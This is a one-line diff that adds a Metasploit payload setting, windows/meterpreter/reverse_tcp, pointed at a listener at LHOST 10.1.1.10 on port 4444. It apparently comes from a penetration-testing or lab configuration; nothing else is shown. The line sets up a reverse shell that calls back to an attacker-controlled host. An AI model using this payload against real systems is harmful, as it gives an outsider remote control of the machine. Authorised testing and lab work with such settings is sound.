@@ -1,0 +1,1 @@
+windows/meterpreter/reverse_tcp LHOST=10.1.1.10 LPORT=4444
